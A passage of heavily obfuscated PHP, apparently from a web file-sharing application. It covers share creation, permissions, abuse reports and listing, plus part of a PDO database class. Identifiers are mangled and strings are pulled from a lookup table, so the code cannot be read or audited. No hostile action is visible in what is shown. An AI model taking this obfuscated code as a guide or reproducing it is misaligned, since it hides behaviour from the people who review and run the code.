($Âˆ§Õõ¶[$€üãº¹¢[670]] == $€üãº¹¢[230] && $œà„ĞŠÒ[$€üãº¹¢[670]] == $€üãº¹¢[91]) { $ËñÔõ¶® = $€üãº¹¢[2134]; } if ($Âˆ§Õõ¶[$€üãº¹¢[670]] == $€üãº¹¢[91] && $œà„ĞŠÒ[$€üãº¹¢[670]] == $€üãº¹¢[230]) { $ËñÔõ¶® = $€üãº¹¢[2137]; } Model($€üãº¹¢[640])->eventShare($­Ç¥ØÇ, $ËñÔõ¶®); return; } private function _addShareData($¾€«í—Ó, $‚×¤É… = array(), $È—ïŞû = false) { $ñğ‹şû =& $_SERVER[°‰†òö¯]; $Üı‚‡¸½ = $È—ïŞû == $ñğ‹şû[191] ? 0 : USER_ID; $ÔĞ³áÜ— = array($ñğ‹şû[493] => $¾€«í—Ó, $ñğ‹şû[1762] => $Üı‚‡¸½); if ($¾€«í—Ó == 0) { $ÔĞ³áÜ— = array($ñğ‹şû[2138] => $‚×¤É…[$ñğ‹şû[1255]], $ñğ‹şû[1762] => $Üı‚‡¸½); } if ($é«óÎ = $this->where($ÔĞ³áÜ—)->find()) { return $é«óÎ[$ñğ‹şû[672]]; } if ($¾€«í—Ó == 0) { $»Ì§·ğÙ = array($ñğ‹şû[32] => get_path_this($‚×¤É…[$ñğ‹şû[87]])); } else { $»Ì§·ğÙ = Model($ñğ‹şû[891])->sourceInfo($¾€«í—Ó); if (!$»Ì§·ğÙ) { return !1; } } if (!$‚×¤É…[$ñğ‹şû[1659]]) { $‚×¤É…[$ñğ‹şû[1659]] = $»Ì§·ğÙ[$ñğ‹şû[32]]; } $ÜøÖåÒÖ = array($ñğ‹şû[1762] => $Üı‚‡¸½, $ñğ‹şû[493] => $¾€«í—Ó, $ñğ‹şû[1659] => $ñğ‹şû[12], $ñğ‹şû[566] => 0, $ñğ‹şû[670] => 0, $ñğ‹şû[1255] => $ñğ‹şû[12], $ñğ‹şû[384] => $ñğ‹şû[12], $ñğ‹şû[962] => $ñğ‹şû[12], $ñğ‹şû[2139] => 0, $ñğ‹şû[2140] => 0, $ñğ‹şû[822] => 0, $ñğ‹şû[2141] => $ñğ‹şû[12], $ñğ‹şû[2122] => $ñğ‹şû[12]); $«¦Ë‘‚Í = explode($ñğ‹şû[50], $ñğ‹şû[2142]); foreach ($«¦Ë‘‚Í as $‚ş¼Òæ) { if (!isset($‚×¤É…[$‚ş¼Òæ])) { continue; } $ÜøÖåÒÖ[$‚ş¼Òæ] = $‚×¤É…[$‚ş¼Òæ]; } $Àáùø´Ù = $this->add($ÜøÖåÒÖ); $ƒ¦Û„á³ = array($ñğ‹şû[2122] => short_id($Àáùø´Ù)); $this->where(array($ñğ‹şû[2143] => $Àáùø´Ù))->save($ƒ¦Û„á³); return $Àáùø´Ù; } private function _shareAuthSet($Ê›»öò, $ßŒÉ–ŞĞ) { $ááîëé¹ =& $_SERVER[°‰†òö¯]; if (!is_array($ßŒÉ–ŞĞ)) { return !1; } $‘¹Ã”Éˆ = Model($ááîëé¹[2084]); $‘¹Ã”Éˆ->where(array($ááîëé¹[672] => $Ê›»öò))->delete(); $ÉÎàòß = array(); foreach ($ßŒÉ–ŞĞ as $Ğ¼”¿íÍ) { $Åô…ä³ã = SourceModel::TYPE_USER; if ($Ğ¼”¿íÍ[$ááîëé¹[190]] == SourceModel::TYPE_GROUP) { $Åô…ä³ã = SourceModel::TYPE_GROUP; } $•ÍşÜøÑ = array($ááîëé¹[672] => $Ê›»öò, $ááîëé¹[190] => $Åô…ä³ã, $ááîëé¹[573] => intval($Ğ¼”¿íÍ[$ááîëé¹[573]]), $ááîëé¹[2080] => 0, $ááîëé¹[2144] => -1); if ($Ğ¼”¿íÍ[$ááîëé¹[2080]]) { $•ÍşÜøÑ[$ááîëé¹[2080]] = $Ğ¼”¿íÍ[$ááîëé¹[2080]]; } else { if ($Ğ¼”¿íÍ[$ááîëé¹[2144]]) { $•ÍşÜøÑ[$ááîëé¹[2144]] = $Ğ¼”¿íÍ[$ááîëé¹[2144]]; } } $ÉÎàòß[] = $•ÍşÜøÑ; } return $‘¹Ã”Éˆ->addAll($ÉÎàòß, array(), !0); } public function numViewAdd($‹¢Ûˆ‰ú) { $‘Ÿò¢—Ì =& $_SERVER[°‰†òö¯]; $ÖúÂòã = array($‘Ÿò¢—Ì[2143] => $‹¢Ûˆ‰ú); $this->where($ÖúÂòã)->setAdd($‘Ÿò¢—Ì[2139]); } public function numDownloadAdd($«´ñ¹«¢) { $…öÂáˆº =& $_SERVER[°‰†òö¯]; $Ç²¤š†Ø = array($…öÂáˆº[2143] => $«´ñ¹«¢); $this->where($Ç²¤š†Ø)->setAdd($…öÂáˆº[2140]); } protected function shareEdit($Å‹Ä€€İ, $’æ˜) { $Üôö¸² =& $_SERVER[°‰†òö¯]; $‹ùºÍÃ¬ = $this->getInfo($Å‹Ä€€İ); if (!$‹ùºÍÃ¬) { return !1; } $this->_checkLinkShare($’æ˜, $‹ùºÍÃ¬); $Ø¬É°Ş€ = array(); $†˜² Šû = explode($Üôö¸²[50], $Üôö¸²[2145]); foreach ($†˜² Šû as $ø½‰Îéı) { if (!array_key_exists($ø½‰Îéı, $’æ˜)) { continue; } $Ø¬É°Ş€[$ø½‰Îéı] = $’æ˜[$ø½‰Îéı]; } $this->shareEventAdd($‹ùºÍÃ¬[$Üôö¸²[193]], $’æ˜, $Üôö¸²[1941]); $this->where(array($Üôö¸²[2143] => $Å‹Ä€€İ))->save($Ø¬É°Ş€); if (isset($’æ˜[$Üôö¸²[2131]])) { $this->_shareAuthSet($Å‹Ä€€İ, $’æ˜[$Üôö¸²[2131]]); } return !0; } private function _checkLinkShare($ÖÌğ¸Ä, $¤ÖÕË) { $×²¨Š–Ö =& $_SERVER[°‰†òö¯]; if ($ÖÌğ¸Ä[$×²¨Š–Ö[566]] != $×²¨Š–Ö[91]) { return; } $‚á¨ËœÄ = $¤ÖÕË[$×²¨Š–Ö[90]][$×²¨Š–Ö[193]]; if ($¤ÖÕË[$×²¨Š–Ö[90]][$×²¨Š–Ö[33]] != $×²¨Š–Ö[232]) { $éÇÀÛ = $this->_folderReport($‚á¨ËœÄ); if (!$éÇÀÛ) { return; } show_json(LNG($×²¨Š–Ö[2146]) . $×²¨Š–Ö[2147] . $éÇÀÛ, !1); } $ãıõàÇŸ = Model($×²¨Š–Ö[891])->fileInfoGet($¤ÖÕË[$×²¨Š–Ö[90]][$×²¨Š–Ö[193]]); if (!$ãıõàÇŸ) { return; } $¿È¢’ = $this->shareFileMeta($ãıõàÇŸ[$×²¨Š–Ö[545]]); if (isset($¿È¢’[$×²¨Š–Ö[452]]) && $¿È¢’[$×²¨Š–Ö[452]] == $×²¨Š–Ö[91]) { show_json(LNG($×²¨Š–Ö[2148]), !1); } } private function _folderReport($ÍŠú“â•) { $Ø÷ÆÇê… =& $_SERVER[°‰†òö¯]; $š÷®ÖØ· = array($Ø÷ÆÇê…[545] => array($Ø÷ÆÇê…[1087], 0), $Ø÷ÆÇê…[811] => 3); $Ùİ±İ­¼ = Model($Ø÷ÆÇê…[2149])->where($š÷®ÖØ·)->field($Ø÷ÆÇê…[545])->select(); if (!$Ùİ±İ­¼) { return !1; } $Ùİ±İ­¼ = array_to_keyvalue($Ùİ±İ­¼, $Ø÷ÆÇê…[12], $Ø÷ÆÇê…[545]); $ªÌñè÷ = $Ø÷ÆÇê…[50] . $ÍŠú“â• . $Ø÷ÆÇê…[50]; $š÷®ÖØ· = array($Ø÷ÆÇê…[545] => array($Ø÷ÆÇê…[7], $Ùİ±İ­¼), $Ø÷ÆÇê…[588] => array($Ø÷ÆÇê…[461], "\45{$ªÌñè÷}\45"), $Ø÷ÆÇê…[507] => 0); $šÑïÔÓ¸ = Model($Ø÷ÆÇê…[891])->where($š÷®ÖØ·)->field($Ø÷ÆÇê…[2150])->find(); if (!$šÑïÔÓ¸) { return !1; } $¡…ãùà = substr($šÑïÔÓ¸[$Ø÷ÆÇê…[588]], strpos($šÑïÔÓ¸[$Ø÷ÆÇê…[588]], $ªÌñè÷)); $š÷®ÖØ· = array($Ø÷ÆÇê…[193] => array($Ø÷ÆÇê…[7], trim($¡…ãùà, $Ø÷ÆÇê…[50]))); $¨àşŒ“à = Model($Ø÷ÆÇê…[891])->where($š÷®ÖØ·)->field($Ø÷ÆÇê…[32])->select(); $¼ùªâ™® = array_to_keyvalue($¨àşŒ“à, $Ø÷ÆÇê…[12], $Ø÷ÆÇê…[32]); $¼ùªâ™®[] = $šÑïÔÓ¸[$Ø÷ÆÇê…[32]]; return implode($Ø÷ÆÇê…[8], $¼ùªâ™®); } protected function remove($Æ°¯ù¤) { $Êìœ­¾á =& $_SERVER[°‰†òö¯]; $¯ç£áœß = is_array($Æ°¯ù¤) ? $Æ°¯ù¤ : array($Æ°¯ù¤); for ($ªàØ…• = 0; $ªàØ…• < count($¯ç£áœß); $ªàØ…•++) { $™öªã”œ = $this->getInfo($¯ç£áœß[$ªàØ…•]); if ($™öªã”œ[$Êìœ­¾á[670]] == $Êìœ­¾á[91]) { Model($Êìœ­¾á[640])->eventShare($™öªã”œ[$Êìœ­¾á[193]], $Êìœ­¾á[2137]); } if ($™öªã”œ[$Êìœ­¾á[566]] == $Êìœ­¾á[91]) { Model($Êìœ­¾á[640])->eventShare($™öªã”œ[$Êìœ­¾á[193]], $Êìœ­¾á[2136]); } $this->shareInfoMofify($™öªã”œ, $Êìœ­¾á[2121]); } $ñ»÷Èóø = array($Êìœ­¾á[672] => array($Êìœ­¾á[7], $¯ç£áœß)); $Ì­Êë£Ä = $this->where($ñ»÷Èóø)->delete(); if ($Ì­Êë£Ä) { Model($Êìœ­¾á[673])->where($ñ»÷Èóø)->delete(); } return $Ì­Êë£Ä; } protected function removeBySource($¸›¥”ê”) { $¹²›¬Â =& $_SERVER[°‰†òö¯]; $âø‰¦™’ = array($¹²›¬Â[493] => array($¹²›¬Â[494], $¸›¥”ê”)); $º¼‰«»³ = $this->field($¹²›¬Â[672])->where($âø‰¦™’)->select(); $¸Å×ËšØ = array_to_keyvalue($º¼‰«»³, $¹²›¬Â[12], $¹²›¬Â[672]); if (!$¸Å×ËšØ) { return; } foreach ($º¼‰«»³ as $Ú¿Å©¸…) { $this->shareInfoMofify($Ú¿Å©¸…, $¹²›¬Â[2121]); } $âø‰¦™’ = array($¹²›¬Â[2143] => array($¹²›¬Â[494], $¸Å×ËšØ)); $this->where($âø‰¦™’)->delete(); Model($¹²›¬Â[673])->where($âø‰¦™’)->delete(); } public function listAll($Á¼½¦™–) { $Şş´Ó• =& $_SERVER[°‰†òö¯]; $ÂÛ¦’  = array(); if ($Á¼½¦™–[$Şş´Ó•[1771]]) { $ÂÛ¦’ [$Şş´Ó•[1771]] = $Á¼½¦™–[$Şş´Ó•[1771]]; } if ($Á¼½¦™–[$Şş´Ó•[821]]) { $ö¯î¸üé = $Á¼½¦™–[$Şş´Ó•[822]] ? $Á¼½¦™–[$Şş´Ó•[822]] : strtotime(date($Şş´Ó•[2151])); $ÂÛ¦’ [$Şş´Ó•[233]] = array($Şş´Ó•[410], array($Á¼½¦™–[$Şş´Ó•[821]], $ö¯î¸üé)); } if ($Á¼½¦™–[$Şş´Ó•[33]]) { $ÂÛ¦’ [$Á¼½¦™–[$Şş´Ó•[33]]] = 1; } else { $ÂÛ¦’ [] = array($Şş´Ó•[566] => array($Şş´Ó•[1087], 0), $Şş´Ó•[670] => array($Şş´Ó•[1087], 0), $Şş´Ó•[2125] => $Şş´Ó•[2074]); } if ($Á¼½¦™–[$Şş´Ó•[2070]]) { $ÂÛ¦’ [] = array($Şş´Ó•[2122] => $Á¼½¦™–[$Şş´Ó•[2070]], $Şş´Ó•[1659] => array($Şş´Ó•[461], "\45{$Á¼½¦™–[$Şş´Ó•[2070]]}\x25"), $Şş´Ó•[2125] => $Şş´Ó•[2074]); } $ÂŒ¡´Šß = $this->_makeOrder()->where($ÂÛ¦’ )->selectPage(20); if (empty($ÂŒ¡´Šß[$Şş´Ó•[447]])) { return array(); } $this->_listDataApply($ÂŒ¡´Šß[$Şş´Ó•[447]]); return $ÂŒ¡´Šß; } public function listDataApply($ØÛË—å·) { $this->_listDataApply($ØÛË—å·); return $ØÛË—å·; } private function _listDataApply(&$êÑ‹İÓÈ) { $…±ö¹ªÔ =& $_SERVER[°‰†òö¯]; $–ôñ¥ù¬ = array_to_keyvalue($êÑ‹İÓÈ, $…±ö¹ªÔ[12], $…±ö¹ªÔ[1771]); $–ıµêêƒ = Model($…±ö¹ªÔ[601])->userListInfo(array_unique($–ôñ¥ù¬)); $¾¾’ƒœ™ = array_to_keyvalue($êÑ‹İÓÈ, $…±ö¹ªÔ[12], $…±ö¹ªÔ[193]); $ßëÙú‡ = Model($…±ö¹ªÔ[891])->sourceListInfo($¾¾’ƒœ™, !0); foreach ($êÑ‹İÓÈ as $‹¦õ•»Å => &$âáàâŸ—) { $Â¶ÑÅ°Ğ = $âáàâŸ—[$…±ö¹ªÔ[1771]]; $âáàâŸ—[$…±ö¹ªÔ[2152]] = $–ıµêêƒ[$Â¶ÑÅ°Ğ] ? $–ıµêêƒ[$Â¶ÑÅ°Ğ] : !1; if (!$âáàâŸ—[$…±ö¹ªÔ[2152]] || $âáàâŸ—[$…±ö¹ªÔ[2152]][$…±ö¹ªÔ[811]] != $…±ö¹ªÔ[91]) { unset($êÑ‹İÓÈ[$‹¦õ•»Å]); continue; } $·¤ÏÉÁË = $âáàâŸ—[$…±ö¹ªÔ[193]]; $âáàâŸ—[$…±ö¹ªÔ[90]] = $ßëÙú‡[$·¤ÏÉÁË] ? $ßëÙú‡[$·¤ÏÉÁË] : !1; if ($âáàâŸ—[$…±ö¹ªÔ[90]][$…±ö¹ªÔ[507]] == $…±ö¹ªÔ[91]) { unset($êÑ‹İÓÈ[$‹¦õ•»Å]); } if ($âáàâŸ—[$…±ö¹ªÔ[90]] != $…±ö¹ªÔ[230] && !$âáàâŸ—[$…±ö¹ªÔ[90]]) { unset($êÑ‹İÓÈ[$‹¦õ•»Å]); } } unset($âáàâŸ—); $êÑ‹İÓÈ = array_values($êÑ‹İÓÈ); } private function _makeOrder($é¹‡ÂÕÏ = '') { $İœó‘Â =& $_SERVER[°‰†òö¯]; $¦ùá¥Ï‰ = array($İœó‘Â[233], $İœó‘Â[822], $İœó‘Â[2139], $İœó‘Â[2140]); $¥‡úø = array($İœó‘Â[525] => $İœó‘Â[526], $İœó‘Â[527] => $İœó‘Â[528]); $Ï³‡ÑÑ = Input::get($İœó‘Â[532], $İœó‘Â[7], $İœó‘Â[499], $¦ùá¥Ï‰); $–ŒÉî‰š = Input::get($İœó‘Â[533], $İœó‘Â[7], $İœó‘Â[2153], array($İœó‘Â[2067], $İœó‘Â[527])); $–ŒÉî‰š = $¥‡úø[$–ŒÉî‰š]; $é¹‡ÂÕÏ = $é¹‡ÂÕÏ . "{$Ï³‡ÑÑ}\40{$–ŒÉî‰š}"; return $this->order($é¹‡ÂÕÏ); } public function reportAdd($§œêíŞ¤) { $ï¯Ö¯Ï¿ =& $_SERVER[°‰†òö¯]; $«ÖƒÂÔÕ = array($ï¯Ö¯Ï¿[672] => $§œêíŞ¤[$ï¯Ö¯Ï¿[672]], $ï¯Ö¯Ï¿[1771] => USER_ID); if (Model($ï¯Ö¯Ï¿[2149])->where($«ÖƒÂÔÕ)->find()) { return !1; } $Î»µõüÁ = array($ï¯Ö¯Ï¿[672] => $§œêíŞ¤[$ï¯Ö¯Ï¿[672]], $ï¯Ö¯Ï¿[1659] => $§œêíŞ¤[$ï¯Ö¯Ï¿[1659]], $ï¯Ö¯Ï¿[193] => $§œêíŞ¤[$ï¯Ö¯Ï¿[193]], $ï¯Ö¯Ï¿[545] => $§œêíŞ¤[$ï¯Ö¯Ï¿[545]], $ï¯Ö¯Ï¿[1771] => USER_ID, $ï¯Ö¯Ï¿[33] => $§œêíŞ¤[$ï¯Ö¯Ï¿[33]], $ï¯Ö¯Ï¿[528] => $§œêíŞ¤[$ï¯Ö¯Ï¿[528]]); return Model($ï¯Ö¯Ï¿[2149])->add($Î»µõüÁ); } public function reportList($Š¶¥Ç½Å) { $×éÄ“£ =& $_SERVER[°‰†òö¯]; $Á¹œÎ¤ = array(); if ($Š¶¥Ç½Å[$×éÄ“£[821]]) { $ôÌˆòË‰ = $Š¶¥Ç½Å[$×éÄ“£[822]] ? $Š¶¥Ç½Å[$×éÄ“£[822]] : strtotime(date($×éÄ“£[2151])); $Á¹œÎ¤[$×éÄ“£[233]] = array($×éÄ“£[410], array($Š¶¥Ç½Å[$×éÄ“£[821]], $ôÌˆòË‰)); } if (isset($Š¶¥Ç½Å[$×éÄ“£[33]]) && in_array($Š¶¥Ç½Å[$×éÄ“£[33]], array($×éÄ“£[91], $×éÄ“£[512], $×éÄ“£[2154], $×éÄ“£[2155], $×éÄ“£[2156]))) { $Á¹œÎ¤[$×éÄ“£[33]] = $Š¶¥Ç½Å[$×éÄ“£[33]]; } if (isset($Š¶¥Ç½Å[$×éÄ“£[811]]) && in_array($Š¶¥Ç½Å[$×éÄ“£[811]], array($×éÄ“£[230], $×éÄ“£[91], $×éÄ“£[512], $×éÄ“£[2154]))) { $Á¹œÎ¤[$×éÄ“£[811]] = $Š¶¥Ç½Å[$×éÄ“£[811]]; } $ÇÕÃËŒè = Input::get($×éÄ“£[533], $×éÄ“£[7], $×éÄ“£[2153], array($×éÄ“£[2067], $×éÄ“£[527])); $àâíªÑ = array($×éÄ“£[525] => $×éÄ“£[526], $×éÄ“£[527] => $×éÄ“£[528]); $ºÕÃØ® = $×éÄ“£[2157] . $àâíªÑ[$ÇÕÃËŒè]; $ƒöµ¬ûº = Model($×éÄ“£[2149])->where($Á¹œÎ¤)->order($ºÕÃØ®)->selectPage(20); if (empty($ƒöµ¬ûº[$×éÄ“£[447]])) { return array(); } $Õ®àØÒÊ = array_to_keyvalue_group($ƒöµ¬ûº[$×éÄ“£[447]], $×éÄ“£[811], $×éÄ“£[672]); if (!empty($Õ®àØÒÊ[0])) { $Š¶¥Ç½Å = $Õ®àØÒÊ[0]; $Á¹œÎ¤ = array($×éÄ“£[672] => array($×éÄ“£[7], $Š¶¥Ç½Å)); $Ø›³çÑğ = $this->where($Á¹œÎ¤)->field($×éÄ“£[672])->select(); $Ø›³çÑğ = array_to_keyvalue($Ø›³çÑğ, $×éÄ“£[12], $×éÄ“£[672]); $³ öœ’ª = array_diff($Š¶¥Ç½Å, $Ø›³çÑğ); if (!empty($³ öœ’ª)) { foreach ($ƒöµ¬ûº[$×éÄ“£[447]] as $øüşè¦¬ => $ä®›º‘å) { if (in_array($ä®›º‘å[$×éÄ“£[672]], $³ öœ’ª)) { unset($ƒöµ¬ûº[$×éÄ“£[447]][$øüşè¦¬]); } } } } $this->_listDataApply($ƒöµ¬ûº[$×éÄ“£[447]]); return $ƒöµ¬ûº; } public function reportStatus($’Ş»·Ğà) { $ø„Á­óÇ =& $_SERVER[°‰†òö¯]; $•â‰çƒš = array($ø„Á­óÇ[477] => $’Ş»·Ğà[$ø„Á­óÇ[477]]); $ÆÕ­üŠÅ = Model($ø„Á­óÇ[2149])->where($•â‰çƒš)->field($ø„Á­óÇ[2158])->find(); if (!$ÆÕ­üŠÅ) { return !1; } $ÀŞèèóƒ = array($ø„Á­óÇ[811] => $’Ş»·Ğà[$ø„Á­óÇ[811]]); if ($’Ş»·Ğà[$ø„Á­óÇ[811]] == $ø„Á­óÇ[2154] && $ÆÕ­üŠÅ[$ø„Á­óÇ[811]] == $ø„Á­óÇ[2154]) { $ÀŞèèóƒ[$ø„Á­óÇ[811]] = 0; } $ÆÑÙàÙ = Model($ø„Á­óÇ[2149])->where($•â‰çƒš)->save($ÀŞèèóƒ); if ($’Ş»·Ğà[$ø„Á­óÇ[811]] == $ø„Á­óÇ[512]) { if ($ÆÕ­üŠÅ[$ø„Á­óÇ[545]] != $ø„Á­óÇ[230] && $this->shareFileMeta($ÆÕ­üŠÅ[$ø„Á­óÇ[545]])) { $this->shareFileMeta($ÆÕ­üŠÅ[$ø„Á­óÇ[545]], 0); } $this->remove($ÆÕ­üŠÅ[$ø„Á­óÇ[672]]); return !0; } if ($ÆÑÙàÙ && $’Ş»·Ğà[$ø„Á­óÇ[811]] == $ø„Á­óÇ[2154]) { $úÏ¯”ˆ„ = $ÀŞèèóƒ[$ø„Á­óÇ[811]] == $ø„Á­óÇ[2154] ? 1 : 0; $this->shareFileMeta($ÆÕ­üŠÅ[$ø„Á­óÇ[545]], $úÏ¯”ˆ„); $this->removeByFile($ÆÕ­üŠÅ[$ø„Á­óÇ[545]]); } return $ÆÑÙàÙ; } private function removeByFile($™´êºÅŒ) { $§§£Ü¦‡ =& $_SERVER[°‰†òö¯]; $¶å¯Ï³ì = Model($§§£Ü¦‡[891])->where(array($§§£Ü¦‡[545] => $™´êºÅŒ))->field($§§£Ü¦‡[193])->select(); $‰Ñˆó·Ö = array_to_keyvalue($¶å¯Ï³ì, $§§£Ü¦‡[12], $§§£Ü¦‡[193]); $ÙĞìª×Õ = array($§§£Ü¦‡[193] => array($§§£Ü¦‡[7], $‰Ñˆó·Ö), $§§£Ü¦‡[566] => 1); $¶å¯Ï³ì = $this->where($ÙĞìª×Õ)->field($§§£Ü¦‡[672])->select(); if (empty($¶å¯Ï³ì)) { return; } $¤€‡©”š = array_to_keyvalue($¶å¯Ï³ì, $§§£Ü¦‡[12], $§§£Ü¦‡[672]); $this->remove($¤€‡©”š); } private function shareFileMeta($¾Ä‹——Ù, $Ù¯Åˆµ‹ = null) { $æ¢Šê¬ =& $_SERVER[°‰†òö¯]; $–¤ã¤ª„ = array($æ¢Šê¬[545] => $¾Ä‹——Ù, $æ¢Šê¬[97] => $æ¢Šê¬[2159]); if (is_null($Ù¯Åˆµ‹)) { return Model($æ¢Šê¬[2160])->where($–¤ã¤ª„)->find(); } $–¤ã¤ª„[$æ¢Šê¬[452]] = $Ù¯Åˆµ‹; Model($æ¢Šê¬[2160])->add($–¤ã¤ª„, array(), !0); } } goto AËŠ¯öÛƒø; aõ°¼Àó¶: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($×ãéƒó· = '') { $Ö¾™Ä½ =& $_SERVER[°‰†òö¯]; if (!class_exists($Ö¾™Ä½[987])) { think_exception(think_lang($Ö¾™Ä½[14]) . $Ö¾™Ä½[988]); } if (!empty($×ãéƒó·)) { $this->config = $×ãéƒó·; if (empty($this->config[$Ö¾™Ä½[17]])) { $this->config[$Ö¾™Ä½[17]] = array(); } } } public function connect($û„Õ‘¨Ï = '', $£˜ã¯Ñ = 0) { $ˆºº¾¨ù =& $_SERVER[°‰†òö¯]; if (!isset($this->linkID[$£˜ã¯Ñ])) { if (empty($û„Õ‘¨Ï)) { $û„Õ‘¨Ï = $this->config; } $„Ÿ­»ÎÀ = !empty($û„Õ‘¨Ï[$ˆºº¾¨ù[17]][$ˆºº¾¨ù[18]]) ? $û„Õ‘¨Ï[$ˆºº¾¨ù[17]][$ˆºº¾¨ù[18]] : $this->pconnect; if ($„Ÿ­»ÎÀ) { $û„Õ‘¨Ï[$ˆºº¾¨ù[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$£˜ã¯Ñ] = new PDO($û„Õ‘¨Ï[$ˆºº¾¨ù[989]], $û„Õ‘¨Ï[$ˆºº¾¨ù[961]], $û„Õ‘¨Ï[$ˆºº¾¨ù[962]], $û„Õ‘¨Ï[$ˆºº¾¨ù[17]]); } catch (PDOException $®·óÇ´) { think_exception($®·óÇ´->getMessage()); } $this->dbType = $this->_getDsnType($û„Õ‘¨Ï[$ˆºº¾¨ù[989]]); if (in_array($this->dbType, array($ˆºº¾¨ù[990], $ˆºº¾¨ù[991], $ˆºº¾¨ù[992], $ˆºº¾¨ù[993]))) { think_exception($ˆºº¾¨ù[994] . $this->dbType . $ˆºº¾¨ù[995] . $this->dbType . $ˆºº¾¨ù[996]); } if (!$this->linkID[$£˜ã¯Ñ]) { think_exception($ˆºº¾¨ù[997]); } try { $this->linkID[$£˜ã¯Ñ]->exec($ˆºº¾¨ù[998] . think_config($ˆºº¾¨ù[964])); } catch (Exception $®·óÇ´) { } $this->connected = !0; if (1 != think_config($ˆºº¾¨ù[22])) { unset($this->config); } } return $this->linkID[$£˜ã¯Ñ]; } public function free() { $this->PDOStatement = null; } public function query($ØúîˆŠ», $÷ÂÎ‰ä‹ = array()) { $¾Ë¶ÆÙ± =& $_SERVER[°‰†òö¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ØúîˆŠ»; if (!empty($÷ÂÎ‰ä‹)) { $this->queryStr .= $¾Ë¶ÆÙ±[999] . print_r($÷ÂÎ‰ä‹, !0) . $¾Ë¶ÆÙ±[1000]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¾Ë¶ÆÙ±[23], 1); think_status($¾Ë¶ÆÙ±[24]); $this->PDOStatement = $this->_linkID->prepare($ØúîˆŠ»); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ñçí·ã£ = $this->PDOStatement->execute($÷ÂÎ‰ä‹); $this->debug(); if (!1 === $Ñçí·ã£) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Šœ¦¾³±, $Ò¦Î¢öª = array()) { $¾ı˜¨– =& $_SERVER[°‰†òö¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Šœ¦¾³±; if (!empty($Ò¦Î¢öª)) { $this->queryStr .= $¾ı˜¨–[999] . print_r($Ò¦Î¢öª, !0) . $¾ı˜¨–[1000]; } $–®Œ–Î = !1; if ($this->dbType == $¾ı˜¨–[993]) { if (preg_match($¾ı˜¨–[1001], $this->queryStr, $›ê¤õõ‚)) { $this->table = think_config($¾ı˜¨–[1002]) . str_ireplace(think_config($¾ı˜¨–[1003]), $¾ı˜¨–[456], $›ê¤õõ‚[2]); $–®Œ–Î = (bool) $this->query($¾ı˜¨–[1004] . strtoupper($this->table) . $¾ı˜¨–[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¾ı˜¨–[25], 1); think_status($¾ı˜¨–[24]); $this->PDOStatement = $this->_linkID->prepare($Šœ¦¾³±); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ü€ª†÷ì = $this->PDOStatement->execute($Ò¦Î¢öª); $this->debug(); if (!1 === $ü€ª†÷ì) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($–®Œ–Î || preg_match($¾ı˜¨–[1005], $Šœ¦¾³±)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $İ¯¿ì§ = $this->_linkID->commit(); $this->transTimes = 0; if (!$İ¯¿ì§) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $à¹„ÈŞ¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$à¹„ÈŞ¤) { $this->error(); return !1; } } return !0; } private function getAll() { $Èºµ¥œ½ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Èºµ¥œ½); return $Èºµ¥œ½; } public function getFields($Á¢º•Ÿ‚) { $…Êœ¬é® =& $_SERVER[°‰†òö¯]; $this->initConnect(!0); if (think_config($…Êœ¬é®[1006])) { $Ë‡ü†©õ = str_replace($…Êœ¬é®[1007], $Á¢º•Ÿ‚, think_config($…Êœ¬é®[1006])); } else { switch ($this->dbType) { case $…Êœ¬é®[990]: case $…Êœ¬é®[1008]: $Ë‡ü†©õ = "\123\x45\114\105\103\x54\40\x20\40\x63\157\x6c\165\155\x6e\137\x6e\141\155\x65\x20\141\x73\40\47\x4e\141\x6d\x65\47\54\x20\x20\x20\x64\x61\x74\x61\x5f\x74\171\160\145\x20\141\x73\x20\47\124\171\160\145\47\54\x20\x20\x20\x63\x6f\x6c\x75\x6d\x6e\137\144\145\x66\141\x75\x6c\x74\40\x61\163\40\47\104\x65\146\141\165\x6c\x74\47\x2c\40\x20\x20\x69\163\137\x6e\165\154\154\141\142\x6c\145\40\141\163\40\x27\116\x75\154\x6c\x27\xa\11\x9\x46\122\x4f\x4d\11\x69\x6e\146\157\x72\x6d\141\x74\151\157\156\137\163\x63\150\145\155\x61\56\x74\x61\142\x6c\x65\x73\x20\101\123\x20\164\xa\x9\x9\112\117\111\116\x9\151\x6e\146\x6f\x72\155\x61\x74\151\157\x6e\137\x73\x63\x68\x65\155\x61\56\143\x6f\154\x75\x6d\156\163\40\x41\x53\40\143\12\x9\x9\117\116\x20\40\164\x2e\x74\x61\142\x6c\145\x5f\143\141\164\x61\154\x6f\147\x20\x3d\x20\143\56\164\141\x62\154\145\x5f\x63\x61\x74\x61\154\157\x67\12\x9\11\101\x4e\x44\x20\164\x2e\164\x61\x62\x6c\x65\137\163\143\x68\x65\x6d\x61\40\75\x20\x63\56\x74\141\142\154\145\x5f\163\143\150\145\155\141\12\x9\x9\x41\x4e\104\x20\x74\56\x74\x61\x62\154\145\137\x6e\x61\155\x65\40\x3d\x20\x63\x2e\x74\141\x62\x6c\145\137\x6e\141\x6d\145\xa\x9\11\x57\x48\x45\x52\105\x20\x20\40\164\56\164\141\142\x6c\145\137\156\141\155\145\x20\x3d\40\x27{$Á¢º•Ÿ‚}\x27"; break; case $…Êœ¬é®[1009]: $Ë‡ü†©õ = $…Êœ¬é®[1010] . $Á¢º•Ÿ‚ . $…Êœ¬é®[1011]; break; case $…Êœ¬é®[991]: case $…Êœ¬é®[993]: $Ë‡ü†©õ = $…Êœ¬é®[1012] . 